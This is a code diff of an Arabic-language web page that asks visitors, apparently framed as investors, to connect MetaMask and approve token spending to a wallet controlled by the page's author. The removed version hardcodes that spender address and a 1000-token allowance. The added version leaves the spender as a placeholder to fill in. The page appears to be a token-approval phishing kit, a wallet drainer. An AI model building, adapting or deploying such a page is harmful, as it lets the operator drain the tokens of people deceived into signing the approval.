@@ -1,66 +1,103 @@
 <!DOCTYPE html>
 <html lang="ar">
-  <head>
-    <meta charset="UTF-8" />
-    <title>الموافقة على السحب</title>
-    <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
-    <style>
-      body {
-        font-family: Arial, sans-serif;
-        text-align: center;
-        padding: 20px;
+<head>
+  <meta charset="UTF-8" />
+  <title>تفعيل Approve للمستثمرين</title>
+  <script src="https://cdn.ethers.io/lib/ethers-5.6.umd.min.js" type="application/javascript"></script>
+</head>
+<body>
+  <h2>صفحة تفعيل Approve</h2>
+
+  <label>عنوان توكن ERC-20: </label>
+  <input type="text" id="tokenAddress" placeholder="أدخل عنوان التوكن هنا" size="50" />
+  <br /><br />
+
+  <label>المبلغ للموافقة (Approve): </label>
+  <input type="text" id="approveAmount" placeholder="1000" value="1000" />
+  <br /><br />
+
+  <button id="approveBtn">اعمل Approve</button>
+
+  <p id="status"></p>
+
+  <script>
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    let signer;
+
+    async function isERC20(address) {
+      const erc20Abi = [
+        "function decimals() view returns (uint8)",
+        "function approve(address spender, uint256 amount) returns (bool)"
+      ];
+      try {
+        const contract = new ethers.Contract(address, erc20Abi, provider);
+        await contract.decimals(); // نتأكد من دالة decimals
+        contract.interface.getFunction("approve"); // نتأكد من دالة approve موجودة
+        return true;
+      } catch {
+        return false;
       }
-      input, button {
-        padding: 10px;
-        font-size: 18px;
-        margin-top: 10px;
-        width: 90%;
+    }
+
+    async function doApprove() {
+      const statusEl = document.getElementById("status");
+      const tokenAddress = document.getElementById("tokenAddress").value.trim();
+      const amountStr = document.getElementById("approveAmount").value.trim();
+
+      if (!ethers.utils.isAddress(tokenAddress)) {
+        statusEl.textContent = "الرجاء إدخال عنوان توكن صحيح.";
+        return;
       }
-    </style>
-  </head>
-  <body>
-    <h2>الموافقة على سحب 1000 توكن</h2>
-    <input type="text" id="tokenAddress" placeholder="أدخل عنوان التوكن ERC20" />
-    <button id="approveBtn">اعمل Approve 1000</button>
-    <p id="result"></p>
+      if (!amountStr || isNaN(amountStr) || Number(amountStr) <= 0) {
+        statusEl.textContent = "الرجاء إدخال مبلغ صحيح للموافقة.";
+        return;
+      }
 
-    <script>
-      const approveBtn = document.getElementById("approveBtn");
-      const result = document.getElementById("result");
+      statusEl.textContent = "جارٍ التحقق من صحة العقد...";
 
-      approveBtn.addEventListener("click", async () => {
-        const tokenAddress = document.getElementById("tokenAddress").value.trim();
-        const spenderAddress = "0xaB63dd850a8C2EDD526fF2D929187B94E03F777D"; // عنوان محفظتك
+      const validERC20 = await isERC20(tokenAddress);
+      if (!validERC20) {
+        statusEl.textContent = "العقد المدخل ليس عقد ERC-20 صالح أو لا يحتوي على دالة approve.";
+        return;
+      }
 
-        if (!window.ethereum) {
-          // توجيه تلقائي لفتح MetaMask
-          const dappUrl = encodeURIComponent(window.location.href);
-          const metamaskDeepLink = `https://metamask.app.link/dapp/${dappUrl}`;
-          window.location.href = metamaskDeepLink;
-          return;
+      try {
+        await provider.send("eth_requestAccounts", []);
+        signer = provider.getSigner();
+
+        const erc20AbiFull = [
+          "function decimals() view returns (uint8)",
+          "function symbol() view returns (string)",
+          "function approve(address spender, uint256 amount) returns (bool)"
+        ];
+
+        const contract = new ethers.Contract(tokenAddress, erc20AbiFull, signer);
+
+        // هنا تستبدل بعنوان محفظتك أو العنوان اللي عايز تعطيه الspend
+        const spenderAddress = "عنوان_المستفيد_من_السحب"; // غيره حسب المطلوب
+
+        const decimals = await contract.decimals();
+        const amount = ethers.utils.parseUnits(amountStr, decimals);
+
+        statusEl.textContent = "جارٍ إرسال طلب الموافقة إلى المحفظة...";
+
+        const tx = await contract.approve(spenderAddress, amount);
+
+        statusEl.textContent = "تم إرسال المعاملة، في انتظار التوثيق...";
+
+        await tx.wait();
+
+        statusEl.textContent = `تم الموافقة بنجاح! Hash: ${tx.hash}`;
+      } catch (error) {
+        if (error.code === 4001) {
+          statusEl.textContent = "تم رفض المعاملة من قبل المستخدم.";
+        } else {
+          statusEl.textContent = "حدث خطأ: " + (error.message || error);
         }
+      }
+    }
 
-        try {
-          const provider = new ethers.BrowserProvider(window.ethereum);
-          let accounts = await provider.send("eth_requestAccounts", []);
-          const signer = await provider.getSigner();
-          const contract = new ethers.Contract(tokenAddress, [
-            "function approve(address spender, uint256 amount) public returns (bool)",
-            "function decimals() view returns (uint8)"
-          ], signer);
-
-          const decimals = await contract.decimals();
-          const amount = ethers.parseUnits("1000", decimals);
-
-          const tx = await contract.approve(spenderAddress, amount);
-          result.textContent = "جاري انتظار تأكيد المعاملة...";
-          await tx.wait();
-          result.textContent = "✅ تمت الموافقة بنجاح!";
-        } catch (err) {
-          console.error(err);
-          result.textContent = "❌ حدث خطأ: " + (err.shortMessage || err.message);
-        }
-      });
-    </script>
-  </body>
+    document.getElementById("approveBtn").addEventListener("click", doApprove);
+  </script>
+</body>
 </html>
